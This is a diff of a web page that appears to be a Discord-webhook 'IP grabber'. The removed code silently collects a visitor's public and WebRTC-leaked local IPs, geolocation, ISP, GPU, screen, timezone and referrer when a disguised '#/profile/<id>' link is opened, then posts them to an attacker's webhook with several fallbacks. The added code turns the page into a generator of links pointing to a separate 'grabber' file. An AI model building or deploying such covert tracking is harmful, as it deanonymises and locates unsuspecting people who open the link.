@@ -15,7 +15,7 @@
     overflow:hidden;-webkit-font-smoothing:antialiased;
   }
   #snow{position:fixed;inset:0;pointer-events:none;z-index:0}
-  .app{position:relative;z-index:1;width:100%;max-width:420px;padding:20px}
+  .app{position:relative;z-index:1;width:100%;max-width:440px;padding:20px}
   .field{
     display:flex;gap:6px;align-items:center;
     background:#0a0a0a;border:1px solid #1e1e1e;
@@ -56,33 +56,33 @@
     pointer-events:none;
   }
   .result.show{opacity:1;transform:translateY(0);pointer-events:auto}
-  .dots{display:flex;gap:10px;justify-content:center}
-  .dots i{
-    width:4px;height:4px;border-radius:50%;background:#fff;
-    display:inline-block;animation:b 1.2s ease-in-out infinite;
-  }
-  .dots i:nth-child(2){animation-delay:.15s}
-  .dots i:nth-child(3){animation-delay:.3s}
-  @keyframes b{0%,100%{opacity:.15}50%{opacity:1}}
 </style>
 </head>
 <body>
 <canvas id="snow"></canvas>
-<div class="app" id="app"></div>
+<div class="app">
+  <div class="field" id="f">
+    <input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">
+    <button id="go">→</button>
+  </div>
+  <div class="status" id="st"></div>
+  <div class="result" id="out"></div>
+</div>
 <script>
 (function(){
   "use strict";
 
-  const WEBHOOK = "";
+  /* path to the grabber file on your host */
+  const GRABBER = "profile.html";
+
   const STORE = "pw";
   const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
-
-  const $   = id => document.getElementById(id);
-  const app = $("app");
-
   const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
+
+  const $ = id => document.getElementById(id);
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
+  /* snow */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -91,21 +91,18 @@
       h = c.height = innerHeight;
       const n = Math.min(160, Math.floor(w*h/22000));
       f = [];
-      for(let i=0;i<n;i++){
-        f.push({
-          x: Math.random()*w, y: Math.random()*h,
-          r: Math.random()*1.5+0.3,
-          vy: Math.random()*0.5+0.15,
-          vx: Math.random()*0.3-0.15,
-          o: Math.random()*0.5+0.15
-        });
-      }
+      for(let i=0;i<n;i++) f.push({
+        x: Math.random()*w, y: Math.random()*h,
+        r: Math.random()*1.5+0.3,
+        vy: Math.random()*0.5+0.15,
+        vx: Math.random()*0.3-0.15,
+        o: Math.random()*0.5+0.15
+      });
     }
     function loop(){
       x.clearRect(0,0,w,h);
       x.fillStyle = "#fff";
-      for(let i=0;i<f.length;i++){
-        const s = f[i];
+      for(const s of f){
         x.globalAlpha = s.o;
         x.beginPath();
         x.arc(s.x, s.y, s.r, 0, 6.283);
@@ -123,419 +120,124 @@
 
   function makeId(){
     const a = new Uint8Array(4);
-    if(window.crypto && crypto.getRandomValues) crypto.getRandomValues(a);
-    else for(let i=0;i<4;i++) a[i] = Math.floor(Math.random()*256);
+    crypto.getRandomValues(a);
     let s = "";
     for(let i=0;i<4;i++) s += CHARS[a[i] % CHARS.length];
     return s;
   }
 
-  const stored = () => { try{ return localStorage.getItem(STORE) || ""; }catch(e){ return ""; } };
-  const save   = v => { try{ localStorage.setItem(STORE, v); }catch(e){} };
+  async function send(webhook, payload){
+    const url  = clean(webhook) + "?wait=true";
+    const json = JSON.stringify(payload);
+    const log  = [];
 
-  function resolveWh(u){
-    const c1 = clean(u); if(c1 && WH_RE.test(c1)) return c1;
-    const c2 = clean(stored()); if(c2 && WH_RE.test(c2)) return c2;
-    const c3 = clean(WEBHOOK);  if(c3 && WH_RE.test(c3)) return c3;
-    return "";
-  }
-
-  function isV6(ip){ return ip.indexOf(":") !== -1; }
-  function isPriv(ip){
-    if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
-    const p = ip.split(".").map(Number);
-    if(p.length !== 4 || p.some(isNaN)) return false;
-    return p[0]===10 || p[0]===127 ||
-           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
-           (p[0]===192 && p[1]===168) ||
-           (p[0]===169 && p[1]===254);
-  }
-
-  function webrtcIPs(timeout){
-    return new Promise(res=>{
-      const out = { v4:{local:new Set(),pub:new Set()}, v6:{local:new Set(),pub:new Set()} };
-      let pc;
-      try{
-        pc = new RTCPeerConnection({
-          iceServers:[
-            {urls:"stun:stun.l.google.com:19302"},
-            {urls:"stun:stun1.l.google.com:19302"},
-            {urls:"stun:stun.cloudflare.com:3478"}
-          ]
-        });
-      }catch(e){ return res(out); }
-      let done = false;
-      const fin = () => {
-        if(done) return;
-        done = true;
-        try{ pc.close(); }catch(e){}
-        res(out);
-      };
-      const t = setTimeout(fin, timeout);
-      pc.onicecandidate = e => {
-        if(!e.candidate){ clearTimeout(t); return fin(); }
-        const parts = e.candidate.candidate.split(" ");
-        const ip = parts[4];
-        if(!ip || /\.local$/i.test(ip)) return;
-        const fam = isV6(ip) ? "v6" : "v4";
-        const scope = isPriv(ip) ? "local" : "pub";
-        out[fam][scope].add(ip);
-      };
-      try{
-        pc.createDataChannel("x");
-        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
-      }catch(e){ clearTimeout(t); fin(); }
-    });
-  }
-
-  function fetchT(url, ms){
-    const ctrl = new AbortController();
-    const t = setTimeout(()=>ctrl.abort(), ms);
-    return fetch(url, {signal:ctrl.signal}).finally(()=>clearTimeout(t));
-  }
-
-  async function publicIP(){
-    for(const url of [
-      "https://api64.ipify.org?format=json",
-      "https://ipv4.icanhazip.com",
-      "https://ipv6.icanhazip.com"
-    ]){
-      try{
-        const r = await fetchT(url, 3000);
-        if(!r.ok) continue;
-        const txt = (await r.text()).trim();
-        const ip = txt.startsWith("{") ? JSON.parse(txt).ip : txt;
-        if(ip) return ip;
-      }catch(e){}
-    }
-    return null;
-  }
-
-  async function geoLookup(ip){
-    const list = [
-      { u:`https://ipwho.is/${ip}`, p:d => d && d.ip ? {
-          ip:d.ip, city:d.city, region:d.region, country:d.country,
-          isp:d.connection && d.connection.isp,
-          org:d.connection && d.connection.org,
-          asn:d.connection && d.connection.asn,
-          type:d.type
-        } : null },
-      { u:`https://ipapi.co/${ip}/json/`, p:d => d && d.ip ? {
-          ip:d.ip, city:d.city, region:d.region, country:d.country_name,
-          isp:d.org, org:d.org, asn:d.asn, type:d.version
-        } : null }
-    ];
-    for(const x of list){
-      try{
-        const r = await fetchT(x.u, 3000);
-        if(!r.ok) continue;
-        const v = x.p(await r.json());
-        if(v && v.ip) return v;
-      }catch(e){}
-    }
-    return null;
-  }
-
-  function bname(ua){
-    const L = [
-      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
-      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
-      ["Samsung", /SamsungBrowser\/([\d.]+)/],
-      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
-      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
-      ["Safari",  /Version\/([\d.]+).*Safari/]
-    ];
-    for(const [n,re] of L){ const m = ua.match(re); if(m) return n + " " + m[1]; }
-    return "Unknown";
-  }
-  function osn(ua){
-    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
-    if(/Windows/.test(ua)) return "Windows";
-    const a = ua.match(/Android ([\d.]+)/); if(a) return "Android " + a[1];
-    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
-    if(/Mac OS X/.test(ua)) return "macOS";
-    if(/CrOS/.test(ua)) return "ChromeOS";
-    if(/Linux/.test(ua)) return "Linux";
-    return "Unknown";
-  }
-  function gpu(){
     try{
-      const c = document.createElement("canvas");
-      const g = c.getContext("webgl") || c.getContext("experimental-webgl");
-      if(!g) return null;
-      const d = g.getExtension("WEBGL_debug_renderer_info");
-      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
-    }catch(e){ return null; }
-  }
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      const r = await fetch(url, { method:"POST", body: fd });
+      log.push("multipart:" + r.status);
+      if(r.ok || r.status === 204) return { ok:true, via:"multipart", log };
+    }catch(e){ log.push("multipart:" + e.message); }
 
-  async function gather(){
-    const n = navigator;
-    const cn = n.connection || n.mozConnection || n.webkitConnection || {};
-    let tz = "unknown";
-    try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
-
-    const [rt, pubIP] = await Promise.all([
-      webrtcIPs(2200),
-      Promise.race([
-        publicIP(),
-        new Promise(r => setTimeout(()=>r(null), 3500))
-      ])
-    ]);
-
-    let geo = null;
-    if(pubIP) geo = await Promise.race([
-      geoLookup(pubIP),
-      new Promise(r => setTimeout(()=>r(null), 3000))
-    ]);
-
-    const setArr = s => [...s];
-
-    return {
-      pubIP: pubIP || null,
-      geo: geo,
-      v4_local: setArr(rt.v4.local),
-      v4_pub:   setArr(rt.v4.pub),
-      v6_local: setArr(rt.v6.local),
-      v6_pub:   setArr(rt.v6.pub),
-      browser: bname(n.userAgent),
-      ua: n.userAgent,
-      os: osn(n.userAgent),
-      platform: n.platform || "unknown",
-      cores: n.hardwareConcurrency || null,
-      memory: n.deviceMemory || null,
-      gpu: gpu(),
-      screen: `${screen.width}×${screen.height}`,
-      avail: `${screen.availWidth}×${screen.availHeight}`,
-      viewport: `${innerWidth}×${innerHeight}`,
-      dpr: devicePixelRatio || 1,
-      depth: screen.colorDepth,
-      lang: n.language || "unknown",
-      langs: (n.languages || []).join(", ") || "unknown",
-      tz: tz,
-      touch: n.maxTouchPoints || 0,
-      conn: cn.effectiveType || null,
-      downlink: cn.downlink || null,
-      referrer: document.referrer || "direct",
-      href: location.href,
-      cookies: navigator.cookieEnabled,
-      dnt: navigator.doNotTrack || null,
-      webdriver: navigator.webdriver || false
-    };
-  }
-
-  const q = v => "`" + v + "`";
-
-  function buildEmbed(id, d, test){
-    const f = [];
-    const g = d.geo || {};
-
-    if(d.pubIP){
-      const fam = d.pubIP.indexOf(":") !== -1 ? "IPv6" : "IPv4";
-      f.push({ name: fam, value: q(d.pubIP), inline: false });
-    }
-    if(g.city || g.region || g.country){
-      f.push({
-        name: "Location",
-        value: q([g.city, g.region, g.country].filter(Boolean).join(", ")),
-        inline: true
+    try{
+      const r = await fetch(url, {
+        method:"POST",
+        headers: { "Content-Type":"application/json" },
+        body: json
       });
-    }
-    if(g.isp || g.org) f.push({ name: "ISP",  value: q(g.isp || g.org), inline: true });
-    if(g.asn)          f.push({ name: "ASN",  value: q(g.asn),          inline: true });
+      log.push("json:" + r.status);
+      if(r.ok || r.status === 204) return { ok:true, via:"json", log };
+    }catch(e){ log.push("json:" + e.message); }
 
-    if(d.v4_local.length) f.push({ name: "Local IPv4", value: q(d.v4_local.join(", ")), inline: true });
-    if(d.v6_local.length) f.push({ name: "Local IPv6", value: q(d.v6_local.join(", ")), inline: true });
-    if(d.v4_pub.length)   f.push({ name: "STUN v4",    value: q(d.v4_pub.join(", ")),   inline: true });
-    if(d.v6_pub.length)   f.push({ name: "STUN v6",    value: q(d.v6_pub.join(", ")),   inline: true });
+    try{
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
+      log.push("no-cors:queued");
+      return { ok:true, via:"no-cors", log };
+    }catch(e){ log.push("no-cors:" + e.message); }
 
-    if(d.conn) f.push({
-      name: "Network",
-      value: q(d.conn + (d.downlink ? " · " + d.downlink + "Mb/s" : "")),
-      inline: true
-    });
+    try{
+      const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
+      log.push("beacon:" + ok);
+      if(ok) return { ok:true, via:"beacon", log };
+    }catch(e){ log.push("beacon:" + e.message); }
 
-    f.push({ name: "OS",       value: q(d.os),                          inline: true });
-    f.push({ name: "Browser",  value: q(d.browser),                     inline: true });
-    f.push({ name: "Platform", value: q(d.platform),                    inline: true });
-    f.push({ name: "Screen",   value: q(d.screen + " · " + d.dpr + "x"),inline: true });
-    f.push({ name: "Viewport", value: q(d.viewport),                    inline: true });
-    f.push({ name: "Depth",    value: q(d.depth + "-bit"),              inline: true });
-    f.push({ name: "CPU",      value: q((d.cores ?? "n/a") + " cores"), inline: true });
-    f.push({ name: "RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"), inline: true });
-    f.push({ name: "Touch",    value: q(d.touch + " pts"),              inline: true });
-    f.push({ name: "Language", value: q(d.lang),                        inline: true });
-    f.push({ name: "Timezone", value: q(d.tz),                          inline: true });
-    f.push({ name: "Cookies",  value: q(d.cookies ? "enabled" : "off"), inline: true });
+    return { ok:false, via:"none", log };
+  }
 
-    if(d.gpu) f.push({ name: "GPU", value: q(d.gpu), inline: false });
-    if(d.referrer && d.referrer !== "direct")
-      f.push({ name: "Referrer", value: q(d.referrer), inline: false });
-
-    const ts = Math.floor(Date.now() / 1000);
+  function testEmbed(id){
+    const ts = Math.floor(Date.now()/1000);
     return {
       username: "visit",
       embeds: [{
-        author: {
-          name: "◼ VISIT" + (test ? " · TEST" : "")
-        },
-        title: q(id),
+        author: { name: "◼ TEST" },
+        title: "`" + id + "`",
         description: "**" + id + "** · <t:" + ts + ":F>",
         color: 0x000000,
-        fields: f,
+        fields: [
+          { name:"Browser",  value:"`" + navigator.userAgent.split(") ")[0].split(" (")[1] || "`n/a`", inline:true },
+          { name:"Language", value:"`" + (navigator.language || "n/a") + "`", inline:true },
+          { name:"Platform", value:"`" + (navigator.platform || "n/a") + "`", inline:true }
+        ],
         footer: { text: id },
         timestamp: new Date().toISOString()
       }]
     };
   }
 
-  async function post(webhook, payload){
-    const url = webhook + "?wait=true";
-    const json = JSON.stringify(payload);
+  const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
+  const setStatus = (m,c) => { st.textContent = m || ""; st.className = "status" + (c ? " " + c : ""); };
 
-    try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      const r = await fetch(url, { method:"POST", body: fd, mode:"cors" });
-      if(r.ok || r.status === 204) return true;
-      console.warn("[post] cors/multipart", r.status);
-    }catch(e){ console.warn("[post] cors/multipart error", e); }
+  try{ inp.value = localStorage.getItem(STORE) || ""; }catch(e){}
 
-    try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
-      return true;
-    }catch(e){ console.warn("[post] no-cors/multipart error", e); }
-
-    try{
-      const r = await fetch(url, {
-        method:"POST", mode:"cors",
-        headers: {"Content-Type":"application/json"},
-        body: json
-      });
-      if(r.ok || r.status === 204) return true;
-      console.warn("[post] cors/json", r.status);
-    }catch(e){ console.warn("[post] cors/json error", e); }
-
-    try{
-      return navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
-    }catch(e){ console.warn("[post] beacon error", e); return false; }
-  }
-
-  async function sendVisit(webhook, id, test){
-    const d = await gather();
-    const payload = buildEmbed(id, d, !!test);
-    return post(webhook, payload);
-  }
-
-  function route(){
-    const hash = location.hash.replace(/^#/, "");
-    let path = hash, qs = "";
-    const i = hash.indexOf("?");
-    if(i !== -1){ path = hash.slice(0, i); qs = hash.slice(i+1); }
-    let m = path.match(/\/?profile\/([A-Za-z0-9_-]+)/);
-    if(!m) m = location.pathname.match(/\/profile\/([A-Za-z0-9_-]+)/);
-    let wh = "";
-    const w = new URLSearchParams(qs).get("w");
-    if(w){
-      try{ wh = decodeURIComponent(escape(atob(w.replace(/-/g,"+").replace(/_/g,"/")))); }catch(e){}
-    }
-    return { id: m ? m[1] : null, wh: wh };
-  }
-
-  function setup(){
-    app.innerHTML =
-      '<div class="field" id="f">' +
-        '<input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">' +
-        '<button id="go">→</button>' +
-      '</div>' +
-      '<div class="status" id="st"></div>' +
-      '<div class="result" id="out"></div>';
-
-    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
-
-    inp.value = stored() || clean(WEBHOOK);
-
-    function setStatus(msg, cls){
-      st.textContent = msg || "";
-      st.className = "status" + (cls ? " " + cls : "");
-    }
-
-    async function run(){
-      const v = clean(inp.value);
-      if(!WH_RE.test(v)){
-        fld.classList.add("bad");
-        setTimeout(()=>fld.classList.remove("bad"), 700);
-        setStatus("invalid webhook", "err");
-        return;
-      }
-
-      fld.classList.remove("bad","ok");
-      save(v);
-
-      const id = makeId();
-      const base = (location.origin && location.origin !== "null")
-        ? location.origin + location.pathname
-        : location.href.split("#")[0];
-      const url = base + "#/profile/" + id;
-
-      out.textContent = url;
-      out.classList.add("show");
-      try{ navigator.clipboard.writeText(url); }catch(e){}
-
-      inp.value = "";
-      inp.placeholder = id;
-
-      btn.disabled = true;
-      btn.textContent = "·";
-      setStatus("sending…");
-
-      try{
-        const ok = await sendVisit(v, id, true);
-        if(!ok) throw new Error("send failed");
-        fld.classList.add("ok");
-        setStatus("sent ✓  ·  " + id, "ok");
-        btn.textContent = "✓";
-      }catch(e){
-        console.warn(e);
-        fld.classList.add("bad");
-        setStatus(String(e.message || e), "err");
-        btn.textContent = "✕";
-      }
-      setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1200);
-    }
-
-    btn.addEventListener("click", run);
-    inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
-    out.addEventListener("click", () => {
-      try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
-    });
-  }
-
-  async function visit(id, wh){
-    app.innerHTML = '<div class="dots"><i></i><i></i><i></i></div>';
-    const target = resolveWh(wh);
-    if(!target){
-      console.warn("no webhook resolved");
-      setTimeout(()=>{ app.innerHTML = ""; }, 200);
+  async function run(){
+    const v = clean(inp.value);
+    if(!WH_RE.test(v)){
+      fld.classList.add("bad");
+      setTimeout(()=>fld.classList.remove("bad"), 700);
+      setStatus("invalid webhook", "err");
       return;
     }
+    try{ localStorage.setItem(STORE, v); }catch(e){}
+
+    fld.classList.remove("bad","ok");
+
+    const id   = makeId();
+    const base = location.href.replace(/[^/]*$/, "");
+    const url  = base + GRABBER + "#" + id;
+
+    out.textContent = url;
+    out.classList.add("show");
+    try{ navigator.clipboard.writeText(url); }catch(e){}
+
+    inp.value = "";
+    inp.placeholder = id;
+
+    btn.disabled = true;
+    btn.textContent = "·";
+    setStatus("sending…");
+
     try{
-      await sendVisit(target, id, false);
+      const r = await send(v, testEmbed(id));
+      if(!r.ok) throw new Error("failed: " + r.log.join(" | "));
+      fld.classList.add("ok");
+      setStatus("sent ✓  ·  " + id + "  ·  " + r.via, "ok");
+      btn.textContent = "✓";
     }catch(e){
-      console.warn("[visit]", e);
+      console.warn(e);
+      fld.classList.add("bad");
+      setStatus(String(e.message || e), "err");
+      btn.textContent = "✕";
     }
-    setTimeout(()=>{ app.innerHTML = ""; }, 200);
+    setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1400);
   }
 
-  function boot(){
-    const r = route();
-    if(r.id) visit(r.id, r.wh);
-    else     setup();
-  }
-
-  window.addEventListener("hashchange", boot);
-  boot();
+  btn.addEventListener("click", run);
+  inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
+  out.addEventListener("click", () => {
+    try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
+  });
 })();
 </script>
 </body>
